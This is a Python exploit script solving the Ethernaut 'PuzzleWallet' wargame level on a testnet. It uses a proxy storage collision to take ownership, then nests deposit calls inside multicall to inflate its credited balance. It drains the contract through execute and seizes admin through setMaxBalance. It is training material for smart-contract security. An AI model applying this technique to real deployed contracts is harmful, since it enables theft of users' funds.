from ape import accounts, project
from .utils.helper import get_level_instance, level_completed, w3
from eth_abi import encode_single

"""
The data:
MethodID: 0xac9650d8 -> this is the multicall function selector
[0]:  0000000000000000000000000000000000000000000000000000000000000020 -> byte offset for the bytes array (bytes[])
[1]:  0000000000000000000000000000000000000000000000000000000000000001 -> length of the bytes aray (contract.multicall([deposit_selector]))
[2]:  0000000000000000000000000000000000000000000000000000000000000020 -> offset for the deposit_selector, which itself is a byte array
[3]:  0000000000000000000000000000000000000000000000000000000000000004 -> length of deposit_selector
[4]:  d0e30db000000000000000000000000000000000000000000000000000000000 -> value of deposit_selector
"""

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0x0AFc648f6D22390d6642Ebc7e1579fC480FE2278"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(
        ETHERNAUT, LEVEL, user, value="0.001 ether", gas=9_000_000
    )

    contract = project.PuzzleWallet.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    # call proposeNewAdmin and become owner
    contract.proposeNewAdmin(user, sender=user)
    assert contract.owner() == user, "!owner"
    print("\n--- we became the new proposed admin ---\n")

    # add yourself to whitelist
    contract.addToWhitelist(user, sender=user)
    assert contract.whitelisted(user), "!whitelisted"
    print("\n--- we added ourselves to the whitelist ---\n")

    # call deposit via multicall
    deposit_selector = w3.keccak(text="deposit()")[:4]
    multicall_selector = w3.keccak(text="multicall(bytes[])")[:4]
    data = multicall_selector + encode_single("(bytes[])", ([[deposit_selector]]))
    calldata = [data] * 32

    contract.multicall(calldata, sender=user, value="0.001 ether")
    assert contract.balances(user) / 10**18 == 0.032, "!balance"
    print("\n--- we called multicall with exploit payload ---\n")

    # call execute to drain contract
    contract.execute(user, contract.balance, b"", sender=user)
    assert contract.balance == 0, "contract bal !0"
    print("\n--- we called execute to drain balance ---\n")

    # set youreself as admin via setMaxBalance()
    contract.setMaxBalance(int(user.address, 0), sender=user)
    assert contract.admin() == user, "!admin"
    print("\n--- We are now the admin ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
